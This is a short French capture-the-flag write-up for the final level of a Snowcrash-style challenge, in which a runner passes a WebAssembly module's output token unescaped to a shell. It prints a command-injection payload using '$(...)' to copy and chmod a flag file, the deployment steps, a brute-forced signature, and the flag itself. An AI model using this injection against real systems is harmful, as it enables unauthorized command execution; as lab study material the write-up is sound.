# Level 10 (dernier niveau)

**Mot de passe du niveau :** flag de `level09`

## Cible
`/opt/snowcrash/level10/enzo_runner` + module `enzo.wasm`

## Vulnérabilité
Le runner `enzo_runner` exécute un module WebAssembly (`enzo.wasm`, que l'on peut
recompiler) dont la sortie est un token de la forme `v1:<payload>:<signature>`.
Cette sortie est ensuite réinjectée dans un **shell** côté runner sans
échappement : on obtient donc une **injection de commande** en plaçant un
`$(...)` dans la chaîne renvoyée par le module.

La signature FNV-1a (`fccb6818` / préfixe `fc`) attendue par le runner est
retrouvée par brute-force d'un salt (script JS fourni dans `howto.txt`).

## Exploitation
1. Compiler `enzo.c` avec le `wasi-sdk`, sa sortie contenant l'injection :
   ```c
   printf("v1:$(cat /home/flag10/.flag > /tmp/level10flag; chmod 777 /tmp/level10flag)9Xu:fccb6818");
   ```
2. `cp enzo.wasm /opt/snowcrash/level10/enzo.wasm`
3. `./enzo_runner` puis `cat /tmp/level10flag`.

Automatisé dans `ressource/exploit.sh` ; brute-force de la signature dans
`ressource/howto.txt`.

## Flag
```
g457ws0du8osi4t4tlea00cxe
```
